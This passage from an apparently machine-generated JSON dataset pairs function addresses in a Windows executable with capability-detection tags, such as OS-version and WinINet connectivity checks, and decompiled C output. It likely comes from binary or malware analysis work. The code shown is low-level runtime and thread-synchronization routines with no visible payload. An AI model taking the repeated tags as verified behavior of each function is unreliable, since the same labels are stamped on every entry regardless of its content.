            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d85c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x41d87b;\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x41d8b7;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.0041d8cc();\n        fcn.0041cd8c();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41d8c8;\n        uStack20 = 0x41d8b6;\n        fcn.0041cef4();\n        return;\n    }\n    puStack16 = 0x41d8c8;\n    fcn.0041d8cc();\n    return;\n}\n",
        "token_count": 267
    },
    "0041dcec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041dcec(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x41dddd;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.00405530();\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        fcn.004055c8();\n    }\n    if (var_4h == 0) {\n        fcn.00404530();\n        fcn.00405794();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x495990;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040dbfc(3, &var_124h);\n    fcn.00404ec4();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x41dde4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 455
    },
    "0041e204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041e204(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41e510;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041e204::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.0041661c();\n            cVar2 = fcn.004047dc();\n            puVar1 = var_14h;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.0041661c(),  puVar1 = var_14h,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x0041e279;\n        }\n        var_14h = puVar1;\n        fcn.0041c9fc();\n        puVar1 = var_14h;\n    }\ncode_r0x0041e279:\n    var_14h = puVar1;\n    // switch table (17 cases) at 0x41e293\n    switch(**_pe_dos_header) {\n    case '\\x01':\n        cVar2 = fcn.0041cfe0();\n        if (cVar2 == '\\a') {\n            fcn.0041daf0();\n            fcn.0041e060();\n        }\n        else {\n            fcn.0041dbec();\n            fcn.00416690();\n        }\n        break;\n    case '\\x02':\n        fcn.0041d0a0();\n        fcn.00416690();\n        break;\n    case '\\x03':\n        fcn.0041daf0();\n        fcn.00416548();\n        fcn.00416690();\n        break;\n    case '\\x04':\n        Var4 = fcn.0041d99c();\n        var_28h = Var4;\n        var_24h = Var4 >> 0x20;\n        fcn.004169c8(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n        break;\n    case '\\x05':\n    case '\\n':\n        fcn.0041e9cc();\n        fcn.004168c0();\n        break;\n    case '\\x06':\n        fcn.0041e8b0();\n        fcn.00416690();\n        break;\n    case '\\a':\n        cVar2 = fcn.0041cfe0();\n        if (cVar2 == '\\r') {\n            fcn.0041eb6c();\n            fcn.00416690();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.0041eb6c();\n            fcn.0041661c();\n            fcn.0041d15c();\n        }\n        else {\n            fcn.0041daf0();\n            var_24h = 0x41e457;\n            fcn.0041e0a8(&stack0xfffffffc);\n        }\n        break;\n    case '\\b':\n        cVar2 = fcn.0041cfe0();\n        if (cVar2 == '\\r') {\n            fcn.0041eb6c();\n            fcn.00416c14();\n        }\n        else {\n            fcn.0041daf0(0xe8);\n            var_24h = 0x41e4a3;\n            (**(*in_EAX + 0x18))();\n            if (var_14h != NULL) {\n                fcn.00416c14();\n            }\n        }\n        break;\n    case '\\t':\n        fcn.0041d100();\n        fcn.00416690();\n        break;\n    case '\\v':\n        fcn.0041ea88();\n        fcn.004168f0();\n        break;\n    case '\\f':\n        var_24h = 0x41e4bf;\n        fcn.0041e0e8(&stack0xfffffffc);\n        break;\n    case '\\x0f':\n        var_24h = 0x41e4df;\n        fcn.0041e144(&stack0xfffffffc);\n        break;\n    case '\\x10':\n        uVar5 = fcn.0041dc58();\n        var_24h = uVar5;\n        fcn.00416c4c(var_24h, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41e517;\n    fcn.00405554();\n    fcn.00405d28();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1256
    },
    "0041e57c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e57c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41e89d;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41e5b5;\n    fcn.0041e96c();\n    puStack80 = 0x41e5c4;\n    (**(**0x49a9b0 + 0x14))();\n    uStack84 = 0x41e87b;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x41e83c;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x28))();\n    if (param_2 == NULL) {\n        fcn.0041e990();\n        iVar1 = fcn.00419014();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.0041e990();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.0041e990();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.0041e990();\n            fcn.0041e51c();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.0041e990();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41e694;\n    fcn.00404528();\n    puStackY108 = 0x41e6a2;\n    iVar1 = fcn.00418d64(arg_8h);\n    in_EAX[0x21] = iVar1;\n    uStackY112 = 0x41e7e1;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41e6c7;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.00407688();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x41e6ed;\n        iVar2 = fcn.00404620();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x41e7be;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.00419910();\n    if (iVar2 < 0) {\n        fcn.0041975c();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.004198b4();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41e7c5;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41e7b5;\n        fcn.00404650();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1295
    },
    "0041e8b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041e90f)\n// WARNING: Removing unreachable block (ram,0x0041e91e)\n\nvoid fcn.0041e8b0(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x41e95a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x41e92d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.0041eb6c();\n    if (cVar1 != '\\v') {\n        fcn.0041ca14();\n    }\n    fcn.004164f0();\n    fcn.0041e990();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41e961;\n    uStack32 = 0x41e959;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 317
    },
    "0041eb80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041eb80(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41ebbc;\n    fcn.0041e990();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41ebc3;\n    uStack20 = 0x41ebbb;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 148
    },
    "0041ef1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ef1c(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.004055c8();\n    var_8h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_8h = fcn.00420490();\n    }\n    if (var_8h == 0) {\n        if (*(in_EAX + 0x5a) != 0) {\n            (**(in_EAX + 0x58))(&var_8h, param_1);\n        }\n        if (var_8h == 0) {\n            var_10h = var_4h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040dbfc(0, &var_10h);\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 311
    },
    "0041f014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0041f014(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0041cf30();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.0041cf30();\n    }\n    if (*(in_EAX + 0x6a) != 0) {\n        (**(in_EAX + 0x68))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.0040487c();\n        if (cVar1 != '\\0') goto code_r0x0041f07e;\n    }\n    fcn.00418f54();\ncode_r0x0041f07e:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 229
    },
    "0041f6c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f6c8(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection(0x49a9d0);\n    *0x49a9b8 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x41f6f8);\n    if (*0x49a9b8 == 0) {\n        fcn.0040f274();\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0041f760": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f760(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041f760::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x495d24) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x41f79e;\n        fcn.0040dbfc(0, &fcn.0041f760::var_14h);\n        uStackY48 = 0x41f7a3;\n        fcn.00404ec4();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x41f7b5;\n        fcn.0041f714();\n    }\n    else {\n        uStackY48 = 0x41f7ae;\n        fcn.0041f720();\n    }\n    var_ch = 0;\n    uStackY48 = 0x49a9d0;\n    puStackY52 = 0x41f7c4;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStackY56 = 0x41f925;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x492b2c;\n    puStackY72 = 0x41f7e0;\n    puStackY52 = &fcn.0041f760::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x41f906;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41f822;\n        puStackY72 = &fcn.0041f760::var_1h + 1;\n        var_8h = fcn.004198b4();\n        uStackY84 = 0x41f82f;\n        fcn.004197a8();\n        uStackY84 = 0x49a9d0;\n        puStackY88 = 0x41f839;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStackY92 = 0x41f8a9;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x41f86a;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041f760::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x41f8b0;\n        uStackY92 = 0x49a9d0;\n        uStackY96 = 0x41f8a8;\n        sub.kernel32.dll_EnterCriticalSection();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x41f90d;\n    uStackY76 = 0x41f905;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 1045
    },
    "0041f938": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f938 noreturn (void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41f9cf;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(in_EAX + 0xd) == '\\0') {\n        uStack40 = 0x41f979;\n        uStack44 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd4;\n        puStack36 = &stack0xfffffffc;\n        (**(*in_EAX + 4))();\n        *in_FS_OFFSET = uStack44;\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41f9d6;\n    cVar1 = *(in_EAX + 0xf);\n    uStack28 = 0x41f9af;\n    (***in_EAX)();\n    *(in_EAX + 4) = 1;\n    uStack28 = 0x41f9bb;\n    fcn.0041f73c();\n    if (cVar1 != '\\0') {\n        uStack28 = 0x41f9c7;\n        fcn.00404650();\n    }\n    // WARNING: Subroutine does not return\n    uStack28 = 0x41f9ce;\n    fcn.00405514();\n}\n",
        "token_count": 377
    },
    "0041fab0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041fab0(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x10) == '\\0')) {\n        fcn.0041fec4();\n        if (*(iVar1 + 0xc) != '\\0') {\n            fcn.0041fe9c();\n        }\n        fcn.0041fecc();\n    }\n    fcn.0041fc18(0, 0);\n    if (*(iVar1 + 4) != 0) {\n        sub.kernel32.dll_CloseHandle_1(*(iVar1 + 4));\n    }\n    fcn.00404640();\n    fcn.00404650();\n    fcn.0041f754();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0041fc18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fc18(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    \n    uStack20 = 0x49a9d0;\n    puStack24 = 0x41fc2a;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack28 = 0x41fcca;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*0x492b2c != 0) && (iVar2 = *(*0x492b2c + 8) + -1,  puStack24 = &stack0xfffffffc,  -1 < iVar2)) {\n        do {\n            ppiVar1 = fcn.004198b4();\n            if ((ppiVar1[2] == NULL) &&\n               (((in_EDX != 0 && (in_EDX == **ppiVar1)) ||\n                ((arg_8h._2_2_ != 0 && (((*ppiVar1)[2] == arg_8h && ((*ppiVar1)[3] == arg_ch)))))))) {\n                fcn.004197a8();\n                fcn.00402f1c();\n                fcn.00402f1c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41fcd1;\n    uStack28 = 0x49a9d0;\n    uStack32 = 0x41fcc9;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 412
    },
    "0041fcd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fcd8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint var_18h;\n    int32_t *var_ch;\n    int32_t var_5h;\n    \n    uStack36 = 0x41fcea;\n    unique0x10000124 = param_2;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 == **0x495d24) {\n        uStack36 = 0x41fcfd;\n        (**(stack0xfffffff8 + 8))();\n        return;\n    }\n    if (var_5h == 0) {\n        var_ch = &fcn.0041fcd8::var_18h;\n    }\n    else {\n        uStack36 = 0x41fd12;\n        var_ch = fcn.00402f00();\n    }\n    uVar2 = var_5h ^ 1;\n    if (uVar2 == 0) {\n        var_ch[2] = 0;\n    }\n    else {\n        uStack36 = 0;\n        uStack40 = 0;\n        uStack44 = 0xffffffff;\n        uStack48 = 0;\n        puStack52 = 0x41fd35;\n        iVar1 = sub.kernel32.dll_CreateEventA();\n        var_ch[2] = iVar1;\n    }\n    uStack56 = 0x41fe4e;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0x49a9d0;\n    puStack68 = 0x41fd5d;\n    puStack52 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack72 = 0x41fe27;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    *(var_ch + 1) = var_5h;\n    puStack68 = &stack0xfffffffc;\n    if (*0x492b2c == 0) {\n        uStack80 = 0x41fd8a;\n        puStack68 = &stack0xfffffffc;\n        *0x492b2c = fcn.00404620();\n    }\n    *var_ch = stack0xfffffff8;\n    uStack80 = 0x41fda4;\n    fcn.0041975c();\n    uStack80 = 0x41fda9;\n    fcn.0041f73c();\n    if (*0x492b1a != 0) {\n        uStack80 = 0x41fdc6;\n        (**0x492b18)();\n    }\n    if (uVar2 != 0) {\n        uStack80 = 0x49a9d0;\n        puStack84 = 0x41fdd4;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStack88 = 0x41fe08;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        iVar1 = var_ch[2];\n        puStack84 = &stack0xfffffffc;\n        sub.kernel32.dll_WaitForSingleObject(iVar1, 0xffffffff);\n        *in_FS_OFFSET = iVar1;\n        iStack92 = 0x41fe0f;\n        sub.kernel32.dll_EnterCriticalSection(0x49a9d0);\n        return;\n    }\n    *in_FS_OFFSET = iStack76;\n    puStack68 = 0x41fe2e;\n    uStack72 = 0x49a9d0;\n    iStack76 = 0x41fe26;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 949
    },
    "0041ffbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ffbc(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.00420224();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.004198b4();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040f94c();\n    }\n    fcn.004201c8();\n    if (*(iVar1 + 4) != 0) {\n        fcn.00420190();\n    }\n    fcn.00419e30();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00420044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420044(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00404620();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.00419910();\n        if (iVar2 < 0) {\n            fcn.0041975c();\n            fcn.00420044();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 202
    },
    "004200d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
